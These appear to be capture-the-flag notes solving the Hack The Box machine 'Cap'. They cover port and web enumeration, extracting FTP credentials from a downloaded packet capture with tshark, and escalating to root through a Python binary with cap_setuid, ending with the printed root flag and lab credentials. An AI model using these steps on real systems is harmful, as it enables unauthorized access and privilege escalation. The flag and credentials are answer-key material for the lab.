<font color="green">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="blue">=======================================================================</font>

| Name | IP Address | Tech Stack | Web Server |  DB |
| ---- | ---------- | ---------- | ---------- | --- |


<hr>

### Loot - Credentials<font color="red">:</font> 

| **User** | **Password**    | **System** |
| -------- | --------------- | ---------- |
| nathan   | Buck3tH4TF0RM3! |            |

<hr>

<font color="green">=======================================================================</font>
# Enumeration
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - Pagina web donde con fuzzing se encuentra security snapshots
- http://10.10.10.245/data/0 #aqui encuentro paquetes/. Download
- whatweb 10.10.10.245
http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
❯ export htf=/home/ass/Documents/GitHub/4rji/4rjinotes/htb/cap/cap.md

<font color="red"></font> 

##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

PORT   STATE SERVICE
```

Services and version on identified open ports.
```bash 
80/tcp open  http    gunicorn
|_http-server-header: gunicorn

PORT   STATE SERVICE VERSION
```


<hr>

##### <font color="red">[+]</font> WFUZZ

###### FILES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --sc 200 -z range,0-1000 -u "http://$IP/data/FUZZ"


# Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload             
000000001:   200        370 L    993 W      17146 Ch    "0"                                                 
000000002:   200        370 L    993 W      17143 Ch    "1"      
=====================================================================
```

###### DIRECTORIES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 200

Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

<hr>

<font color="green">=======================================================================</font>
# Post Exploitation
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 


##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
- **Compilation version and architecture**:


##### <font color="red">[+]</font> List Interesting Directories<font color="red">:</font> 

- **/tmp**:
- **/opt**:
- **/var/tmp**:
- **/dev/shm**:
- **/var/backups/**:
- **/var/mail**:

##### <font color="red">[+]</font> S/getcap<font color="red">:</font> 

- SUIDs:
```bash
getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

##### <font color="red">[+]</font> ROOT Processes (ps) <font color="red">:</font> 
```bash
ps aux | grep -i root --color
```

##### <font color="red">[+]</font> Local Network Services (netstat/ss)<font color="red">:</font> 
```bash
# (or ss if netstat not available)
netstat -tunlp | grep '127.0.0.1' --color=auto
netstat -antup | grep '127.0.0.1' --color=auto
```

##### <font color="red">[+]</font> packated<font color="red">:</font> 
```bash
tshark -r captura.cap | grep -i pass
   38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
   40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS Buck3tH4TF0RM3!
tshark -r captura.cap | grep -i user
   36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
   
``` 

Cuando descargue el paquete de la pagina. encontre en esa captura esos datos de arriba donde viene contrasena y usuario.

##### <font color="red">[+]</font> otros tshark  que es el equivalente de wireshark:
analyze > follow > TCP stream
```tshark -r 0.pcap -Y "ftp" 2>/dev/null```

Luego para ver el payload:
```
tshark -r 0.pcap -Y "ftp" -Tjson 2>/dev/null

"tcp.payload": "32:32:31:20:47:6f:6f:64:62:79:65:2e:0d:0a"
```

Para buscar por campo:
```
tshark -r 0.pcap -Y "ftp" -Tfields -e tcp.payload 2>/dev/null
323230202876734654506420332e302e33290d0a
55534552206e617468616e0d0a
33333120506c656173652073706563696679207468652070617373776f72642e0d0a
50415353204275636b33744834544630524d33210d0a

```

Luego lo convertimos

```
tshark -r 0.pcap -Y "ftp" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

``` 
ftp $ip
#usando las credenciales encontradas
```

```ssh nathan@$ip```

Adentro de la maquina buscamos getcap y encontramos python.
```bash
python3
import os
os.setuid(0)
os.system("bash")

tenemos consola y luego:

buscamos las flags. listo

cd /root/
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt 
9ddce4f28c53bd3be26f65d202536e5f
```